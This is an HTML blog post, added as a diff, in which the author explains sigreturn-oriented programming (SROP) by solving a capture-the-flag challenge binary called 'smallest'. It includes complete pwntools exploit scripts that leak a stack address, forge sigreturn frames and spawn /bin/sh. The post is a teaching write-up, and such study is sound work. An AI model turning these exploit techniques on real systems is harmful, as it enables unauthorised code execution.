@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="srop利用  所谓的srop，是rop的一种，被ctfwiki称为是高级栈溢出，它的利用手法，我挂出下面两个链接参考学习： SROP - CTF Wiki (ctf-wiki.org) https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1944y1J7fS&#x2F;?spm_id_from&#x3D;333.337.search-card.all.click 简单的来说呢，就是利用系统调用号为15">
+<meta property="og:type" content="article">
+<meta property="og:title" content="srop利用">
+<meta property="og:url" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="srop利用  所谓的srop，是rop的一种，被ctfwiki称为是高级栈溢出，它的利用手法，我挂出下面两个链接参考学习： SROP - CTF Wiki (ctf-wiki.org) https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1944y1J7fS&#x2F;?spm_id_from&#x3D;333.337.search-card.all.click 简单的来说呢，就是利用系统调用号为15">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/1.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/2.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/3.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/4.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/5.png">
+<meta property="article:published_time" content="2024-06-11T10:59:53.000Z">
+<meta property="article:modified_time" content="2024-06-11T12:40:03.800Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>srop利用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/06/12/NewStarCTF-stack-migration/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/06/09/cmcc-simplerop/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&text=srop利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&is_video=false&description=srop利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=srop利用&body=Check out this article: http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&name=srop利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&t=srop利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">srop利用</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        srop利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-11T10:59:53.000Z" itemprop="datePublished">2024-06-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">srop利用</h1>
+
+<p>所谓的srop，是rop的一种，被ctfwiki称为是高级栈溢出，它的利用手法，我挂出下面两个链接参考学习：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1944y1J7fS/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1944y1J7fS/?spm_id_from=333.337.search-card.all.click</a></p>
+<p>简单的来说呢，就是利用系统调用号为15（64位）的系统调用，对所有的寄存器进行重新赋值，达到控制所有寄存器的目的，下面将讲解一道题目，对srop构建认知：</p>
+<p>题目链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cYiWPoTO5FaavbMTy0Hgmw?pwd=uldz">https://pan.baidu.com/s/1cYiWPoTO5FaavbMTy0Hgmw?pwd=uldz</a><br>提取码：uldz </p>
+<p>好了，现在开始，我们来看题目，我们先checksec一下，并拖入IDA中：</p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/1.png" alt="1"></p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/2.png" alt="2"></p>
+<p>代码非常的短，几乎没有独立的片段供我们使用，很明显，可以看出，所调用的函数是read函数，整个代码，除了ret指令，没有对（栈顶）rsp做出移动的指令，这是不同于常规程序的，也就是说，读入的地方，也就是我们ret所返回的地方，因为没有bss段，也没有”&#x2F;bin&#x2F;sh”字符串，所以说，泄露栈地址，成了必要的条件（往里面写”&#x2F;bin&#x2F;sh”），想要执行write函数泄露栈地址，就必须使rax等于1，而我们溢出无论返回到程序哪里，都无法使rax等于1，但是，别忘了，我们有read函数，read函数执行完毕，会将读入的字节数写入到rax寄存器中，也就是说，让read函数读入一个字节，就可以了。该部分payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./smallest&quot;,&quot;b *0x4000B0&quot;)</span></span><br><span class="line">sh = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.send(<span class="string">b&quot;\xb8&quot;</span>)</span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr----------&gt;&quot;</span>,<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
+
+<p>下面，开始gdb调试之路：</p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/3.png" alt="3"></p>
+<p>此时，已经将start_addr发送了三遍，并写在了栈上，上图可以看出，接下来，返回继续执行read函数，并发送”\xb8”：</p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/4.png" alt="4"></p>
+<p>此时发送完成，rax成功等于1，同时由于我们发送了一个字节，所以，0x4000b0最后一个字节被覆盖，变成0x4000b8，指向函数发生改变，刚好绕过xor rax,rax指令，可谓非常的妙，接下里，write函数将泄露0x400个字节，我们选一个作为日后rsp指向的位置即可：</p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/5.png" alt="5"></p>
+<p>执行完毕后，程序再次返回到read函数，接下来的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = stack_addr</span><br><span class="line">sig.rsp = stack_addr</span><br><span class="line">sig.rdx = <span class="number">0x500</span></span><br><span class="line">sig.rip = syscall_ret_addr</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload_2 = p64(start_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x8</span>) + <span class="built_in">bytes</span>(sig)</span><br><span class="line">sh.send(payload_2)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload_3 = p64(syscall_ret_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x7</span>)</span><br><span class="line">sh.send(payload_3)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sign = SigreturnFrame()</span><br><span class="line">sign.rax = <span class="number">59</span></span><br><span class="line">sign.rdi = stack_addr + <span class="number">0x200</span></span><br><span class="line">sign.rsi = <span class="number">0</span></span><br><span class="line">sign.rdx = <span class="number">0</span></span><br><span class="line">sign.rsp = stack_addr</span><br><span class="line">sign.rip = syscall_ret_addr</span><br><span class="line">payload_4 = p64(start_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x8</span>) + <span class="built_in">bytes</span>(sign) + <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x200</span>-<span class="number">0x8</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(<span class="built_in">bytes</span>(sign))) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">sh.send(payload_4)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload_5 = p64(syscall_ret_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x7</span>)</span><br><span class="line">sh.send(payload_5 )</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们布置寄存器（pwntools提供函数供我们调用）并再次返回到read函数,读入0xf个字节【p64(syscall_ret_addr) + b”A”*(0x7)】，让rax等于0xf，此时ret到syscall，因为rax&#x3D;0xf，继续执行系统调用，此时rip被设置指向syscall指令，rsp被设置为stack_addr,因为寄存器布置完成，所以调用read函数，发送了payload_4,向stack_addr写入payload_4,此时再次ret到read函数，读入payload_5,rax又等于0xf，此时再ret 到syscall，执行系统调用，布置寄存器，此时rip为syscall_ret_addr，再次syscall，因为寄存器布置好了，执行execve函数，get shell，最终payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./smallest&quot;,&quot;b *0x4000B0&quot;)</span></span><br><span class="line">sh = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.send(<span class="string">b&quot;\xb8&quot;</span>)</span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr----------&gt;&quot;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = stack_addr</span><br><span class="line">sig.rsp = stack_addr</span><br><span class="line">sig.rdx = <span class="number">0x500</span></span><br><span class="line">sig.rip = syscall_ret_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload_2 = p64(start_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x8</span>) + <span class="built_in">bytes</span>(sig)</span><br><span class="line">sh.send(payload_2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload_3 = p64(syscall_ret_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x7</span>)</span><br><span class="line">sh.send(payload_3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sign = SigreturnFrame()</span><br><span class="line">sign.rax = <span class="number">59</span></span><br><span class="line">sign.rdi = stack_addr + <span class="number">0x200</span>   </span><br><span class="line">sign.rsi = <span class="number">0</span></span><br><span class="line">sign.rdx = <span class="number">0</span></span><br><span class="line">sign.rsp = stack_addr</span><br><span class="line">sign.rip = syscall_ret_addr</span><br><span class="line">payload_4 = p64(start_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x8</span>) + <span class="built_in">bytes</span>(sign) + <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x200</span>-<span class="number">0x8</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(<span class="built_in">bytes</span>(sign))) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">sh.send(payload_4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload_5 = p64(syscall_ret_addr) + <span class="string">b&quot;A&quot;</span>*(<span class="number">0x7</span>)</span><br><span class="line">sh.send(payload_5 )</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">srop利用</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&text=srop利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&is_video=false&description=srop利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=srop利用&body=Check out this article: http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&title=srop利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&name=srop利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/&t=srop利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
